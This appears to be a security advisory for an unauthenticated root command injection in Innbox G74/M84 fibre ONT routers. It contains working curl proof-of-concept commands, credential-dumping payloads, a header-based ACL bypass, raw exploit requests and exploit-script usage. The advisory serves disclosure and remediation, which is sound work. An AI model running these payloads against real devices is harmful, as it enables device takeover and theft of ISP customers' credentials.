# Innbox G74/M84 - Unauthenticated Remote Code Execution via login.xgi CLI Parameter

## Summary

A critical unauthenticated remote code execution vulnerability exists in Innbox G74 and M84 series GPON ONT devices. The `/login.xgi` endpoint accepts a `CLI` parameter that passes user-supplied input directly to a shell without any authentication or input sanitization. An attacker on the network can execute arbitrary commands as root, leading to complete device compromise.

**CVSS 3.1 Score:** 9.8 (Critical)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

## Affected Products

| Vendor | Product | Confirmed Firmware |
|--------|---------|-------------------|
| Innbox | G74 | Multiple versions |
| Innbox | M84 (InnboxM84) | Linux 3.18.21 (Aug 2023 build) |

Other Innbox GPON ONT models sharing the same codebase are likely affected.

---

## Vulnerability Details

### CWE Classification

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-306:** Missing Authentication for Critical Function

### Root Cause

The device's web interface exposes a CGI endpoint at `/login.xgi` intended for authentication. However, this endpoint also accepts a `CLI` parameter that is passed directly to a system shell for execution. The vulnerability has two critical flaws:

1. **No Authentication Required:** The `CLI` parameter is processed before any authentication check occurs
2. **No Input Sanitization:** User input is passed directly to the shell without filtering dangerous characters or commands

### Vulnerable Code Path

```
HTTP Request → /login.xgi?CLI=<payload> → CGI Handler → system() / popen() → Shell Execution as root
```

---

## Technical Analysis

### Request Format

The device's CGI handler parses the `CLI` parameter and executes it via shell. To capture command output, attackers can redirect stdout/stderr to a file in the web-accessible `/etc/www/graphic/` directory.

**Payload Structure:**
```
/login.xgi?CLI=exec,>,/etc/www/graphic/OUTPUT.txt,2>&1;COMMAND
```

**Breakdown:**
- `exec,>,/path/file,2>&1` — Redirect all output to a readable file (commas used as token separators by the CGI parser)
- `;COMMAND` — The command to execute
- Output readable at `/graphic/OUTPUT.txt`

### Key Observations

1. The CGI parser uses **commas as token separators** in the redirect preamble (not spaces)
2. Commands execute as **UID 0 (root)** with full system privileges
3. Output files are written to a **publicly accessible directory** without authentication
4. The device runs **BusyBox/mips Linux** with standard Unix utilities available

---

## Proof of Concept

### Step 1: Verify Vulnerability

```bash
# Set target IP
T="192.168.1.1"

# Generate random marker to avoid cache
M="poc$$"

# Execute id command, write output to web directory
curl -s "http://$T/login.xgi?CLI=exec,>,/etc/www/graphic/$M.txt,2>&1;id;uname%20-a"

# Wait for execution
sleep 2

# Read output (no authentication required)
curl -s "http://$T/graphic/$M.txt"
```

**Expected Output:**
```
uid=0 gid=0
Linux InnboxM84 3.18.21 #1 SMP Thu Aug 3 18:47:03 CST 2023 mips unknown
```

### Step 2: Extract Device Credentials

The device stores administrative credentials in its configuration system, accessible via `csmconf`:

```bash
T="192.168.1.1"
M="creds$$"

# Extract admin username and password
curl -s "http://$T/login.xgi?CLI=exec,>,/etc/www/graphic/$M.txt,2>&1;csmconf%20-g%20/sys/user:1/name;csmconf%20-g%20/sys/user:1/password"

sleep 2
curl -s "http://$T/graphic/$M.txt"
```

**Example Output:**
```
admin
4946Frog01
```

### Step 3: Interactive Shell

Using the PoC exploit script:

```bash
python3 exploit.py http://192.168.1.1/
```

**Output:**
```
[*] target : http://192.168.1.1/
[*] status : 200
[*] server : ...
[*] title  : ...

[+] unauthenticated RCE confirmed (running as root):

    OK_f6e1cb
    uid=0 gid=0
    Linux InnboxM84 3.18.21 #1 SMP Thu Aug 3 18:47:03 CST 2023 mips unknown

[*] account dump (csmconf /sys/user:N):

  user:1   admin : 4946Frog01

[*] interactive shell -- type 'exit' or Ctrl-D to quit

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
...

$ ls /etc/config/
buildver
buildmodel
...
```

---

## Additional Attack Vectors

### Finding 2: Unauthenticated File Upload (/upload_logo.xgi)

The `/upload_logo.xgi` endpoint accepts file uploads without authentication. While the file is validated before being used for firmware operations, this could potentially be chained with other vulnerabilities.

```bash
curl -X POST "http://$T/upload_logo.xgi" \
  -F "logo=@malicious.bin;filename=logo.bin"
```

### Finding 3: LAN ACL Bypass (RequestFrom Header)

Certain maintenance pages are protected by a LAN-only ACL that checks the `RequestFrom` header. This can be bypassed by adding:

```
RequestFrom: MyInnbox
```

This bypass only affects specific firmware builds where `cfg_get_customize() == 6`.

<img width="2100" height="1478" alt="image" src="https://github.com/user-attachments/assets/57d79094-0fb5-4754-b14c-3eb9c9f89de3" />

---

## Impact Assessment

### Confidentiality: HIGH
- Full read access to device filesystem
- Extraction of stored credentials (admin, PPPoE, TR-069, WiFi)
- Access to private keys (stunnel, CWMP)
- Network reconnaissance capabilities

### Integrity: HIGH
- Arbitrary file modification
- Configuration tampering
- Firmware modification
- Persistent backdoor installation

### Availability: HIGH
- Device denial of service
- Network disruption capabilities
- Brick device via firmware corruption

### Attack Scenarios

1. **ISP Network Compromise:** Mass exploitation of customer premises equipment
2. **Credential Harvesting:** Extract admin/PPPoE credentials across ISP network
3. **Botnet Recruitment:** Install persistent malware for DDoS/cryptomining
4. **Man-in-the-Middle:** Modify DNS/routing to intercept customer traffic
5. **Lateral Movement:** Use as pivot point into customer LAN

---

## Remediation

### For Vendors

1. **Remove CLI parameter from login.xgi** — This debug/backdoor functionality should not exist in production firmware
2. **Implement proper authentication** — All CGI endpoints must verify session before processing parameters
3. **Input sanitization** — If CLI functionality is required, implement strict allowlisting
4. **Restrict web directory permissions** — `/etc/www/graphic/` should not be world-writable

### For ISPs/Operators

1. **Firmware update** — Deploy patched firmware when available
2. **Network segmentation** — Isolate ONT management interfaces from customer LAN
3. **ACL enforcement** — Block external access to device web interface
4. **Monitoring** — Alert on suspicious `/login.xgi?CLI=` requests

### For End Users

1. **Firewall rules** — Block port 80/443 access to the ONT from LAN if not needed
2. **Contact ISP** — Request firmware update or device replacement
3. **Network monitoring** — Watch for unusual outbound connections from the ONT

---

## Timeline

| Date | Event |
|------|-------|
| 2026-XX-XX | Vulnerability discovered during authorized security assessment |
| 2026-XX-XX | Vendor notified |
| 2026-XX-XX | CVE requested |
| 2026-XX-XX | Public disclosure |

---

## References

- Exploit PoC: `exploit.py` (provided separately)
- Device documentation: [Innbox product page]
- Similar vulnerabilities: CVE-XXXX-XXXX (other GPON ONT command injection)

---

## Appendix A: Exploit Script Usage

```
usage: exploit.py [-h] [-f {1,2,3,all}] [-c COMMAND] [--loot] [--cleanup]
                  [-t TIMEOUT] [-v]
                  [url]

Innbox G74 PoC

positional arguments:
  url                   http://target/

options:
  -h, --help            show this help message and exit
  -f, --finding {1,2,3,all}
                        run a specific finding instead of the interactive shell
  -c, --command COMMAND
                        run one command and exit
  --loot                dump device secrets after RCE
  --cleanup             remove leftover output files
  -t, --timeout TIMEOUT
  -v, --verbose
```

**Examples:**
```bash
# Interactive shell (default)
python3 exploit.py http://192.168.1.1/

# Single command execution
python3 exploit.py http://192.168.1.1/ -c "cat /etc/passwd"

# Dump all secrets
python3 exploit.py http://192.168.1.1/ --loot

# Run all findings
python3 exploit.py http://192.168.1.1/ -f all
```

---

## Appendix B: Raw HTTP Requests

### Vulnerable Request (Command Injection)

```http
GET /login.xgi?CLI=exec,>,/etc/www/graphic/out.txt,2>&1;id HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Connection: close
```

### Output Retrieval (No Auth Required)

```http
GET /graphic/out.txt HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Connection: close
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

uid=0 gid=0
```
